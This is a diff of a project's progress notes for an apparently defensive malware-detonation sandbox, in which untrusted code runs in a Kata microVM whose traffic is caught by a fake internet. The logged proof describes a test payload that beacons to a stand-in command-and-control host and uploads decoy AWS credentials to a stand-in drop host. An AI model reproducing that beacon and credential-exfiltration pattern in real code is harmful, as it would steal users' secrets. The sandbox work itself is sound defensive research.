@@ -139,10 +139,38 @@ was detonated through the forge. Under the OLD sinkhole this stays dormant (fals
 - Honest-limits hook present: a client TLS refusal after our leaf (cert-pinning/mTLS) -> captured as
   `tls_intercept_refused` ("encrypted C2 attempted, interception refused"), never a false clean.
 - Fixed in installer: added `dnsmasq-base` to base packages (forge DNS).
-- NEXT (A4): integrate the microVM's Kata-CNI egress into the forge netns (so the malware runs IN the
-  microVM, not a host process), then rewire /api/deep -> single-host+microVM substrate, browser proof,
-  retire the two-VM path. The forge correctness itself is now PROVEN; A4 is the microVM<->forge wiring +
-  app integration.
+## A4 NETWORK INTEGRATION PROVEN — full attack runs INSIDE a real microVM through the forge
+The two proven halves compose. Established by trying (4 attempts pinned the exact requirement):
+Kata-FC enumerates the container netns and accepts ONLY a clean veth `eth0` (it makes the tap itself via
+`internetworking_model=tcfilter`) — it rejects a bridge ("Unsupported network interface: bridge") and a
+same-netns veth (ParseInt ""). The working topology (now in forge/forge-up.sh):
+- forge netns `cr-forge-<id>`: forgebr@169.254.0.1 + dnsmasq(answer-all) + mitmproxy(forge) + REDIRECT all
+  TCP; holds the veth peer `crpeer` on the bridge.
+- run netns `cr-run-<id>`: ONLY `eth0` (169.254.0.2, veth, peer=crpeer in cr-forge), default route via the
+  forge. `ctr run --with-ns network:/var/run/netns/cr-run-<id> --runtime io.containerd.run.kata-fc.v2` ->
+  Kata tcfilter turns eth0 into the microVM tap.
+- PROOF (real python:3.12-slim microVM detonation): guest sets resolv.conf->forge, beacons
+  http://evil-c2.example/beacon -> forge answers 200 -> `CR_FIX_GATE_OPEN` -> exfils decoy creds to
+  drop.evil-c2.example -> `CR_FIX_EXFIL_SENT`. Forge CAPTURE: `evil-c2.example /beacon` +
+  `drop.evil-c2.example /upload | aws_access_key_id=AKIA_CR_DECOY_CANARY&aws_secret_access_key=...` — the FULL
+  attack captured from INSIDE the microVM (real C2 names via SNI/Host + the stolen creds). NO real packet
+  left (run netns has only 169.254.0.0/24, no internet route; every name -> forge). forge-down: netns_left=0
+  mitm_procs_left=0 (zero orphans). Re-proven with the canonical forge-up.sh/forge-down.sh.
+- Detail: Kata does NOT propagate the guest resolv.conf through FC -> the detonation HARNESS writes it
+  (`nameserver 169.254.0.1`) as its first step, before the untrusted code runs. busybox/musl wget had a
+  resolver quirk; the real harness is python (glibc/getaddrinfo), which resolves cleanly (proven).
+- setup-host.sh pins `internetworking_model=tcfilter`.
+
+## NEXT — A4 app integration + the orchestrator (toward the /api/deep browser proof)
+The substrate (isolation), forge (correctness), and their composition (microVM detonation through forge) are
+all PROVEN. Remaining for A4: the host ORCHESTRATOR that, per scan, (1) reuses stage-1's pinned clone, (2)
+builds/【selects】a detonation guest image carrying the runtimes + in-guest harness (writes resolv.conf->forge,
+plants decoy creds, runs the repo's build+run, observes) + the mitmproxy CA, (3) forge-up -> detonate via
+kata-fc -> collect the forge capture + in-guest observations -> forensic record -> forge-down (zero orphans),
+then rewire /api/deep (Node route) to spawn THIS orchestrator instead of the two-VM orchestrate.sh, keep the
+[orch] milestones + attach-forensics, prove a real detonation end-to-end in localhost:2311, retire the
+two-VM path. Then B (warm pool, ~30s, parallelize, per-phase timing), C (real OpenCode 3 agents), D (report),
+E (whole-product).
 
 ## Live status
 - 2026-06-28: mandate received. Comprehended current arch + infra. Started A0 feasibility probe.
